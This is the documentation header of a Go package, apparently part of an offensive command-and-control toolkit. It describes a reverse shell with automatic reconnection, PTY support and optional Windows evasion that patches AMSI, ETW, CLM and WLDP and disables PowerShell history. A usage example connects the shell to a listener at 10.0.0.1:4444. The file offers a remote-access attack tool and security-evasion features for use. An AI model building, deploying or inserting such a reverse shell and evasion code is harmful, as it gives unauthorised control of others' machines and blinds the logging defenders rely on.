// Package shell provides a reverse shell implementation with automatic
// reconnection, PTY support, and optional Windows evasion techniques.
//
// Technique: Reverse shell with transport abstraction and evasion integration.
// MITRE ATT&CK: T1059 (Command and Scripting Interpreter)
// Platform: Cross-platform (Windows: cmd.exe direct I/O, Unix: PTY via creack/pty)
// Detection: High -- reverse shell traffic patterns are well-known indicators.
//
// Key features:
//   - Automatic reconnection with configurable retry count and delay
//   - Transport-agnostic design (works with any c2/transport.Transport)
//   - PTY support on Unix for full interactive terminal
//   - Optional Windows evasion: AMSI, ETW, CLM, WLDP patching and PS history disable
//   - Graceful shutdown via Stop() and Wait()
//
// Example:
//
//	trans := transport.NewTCP("10.0.0.1:4444", 10*time.Second)
//	sh := shell.New(trans, nil)
//	sh.Start(context.Background())
package shell
